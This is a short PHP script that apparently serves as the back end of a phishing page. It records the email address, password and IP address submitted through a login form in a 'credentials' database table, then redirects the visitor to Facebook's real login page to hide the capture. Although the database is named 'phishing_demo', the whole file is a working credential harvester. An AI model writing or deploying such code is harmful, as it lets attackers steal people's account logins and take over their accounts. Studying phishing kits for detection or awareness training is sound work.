<?php
ob_start();

$conn = new mysqli("localhost", "root", "", "phishing_demo");
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$location = 'Unknown';

if (!empty($email) && !empty($password)) {
    $stmt = $conn->prepare("INSERT INTO credentials (email, password, ip_address, location) VALUES (?, ?, ?, ?)");
    $stmt->bind_param("ssss", $email, $password, $ip, $location);
    $stmt->execute();
    $stmt->close();
}

$conn->close();
header("Location: https://www.facebook.com/login/");
exit;
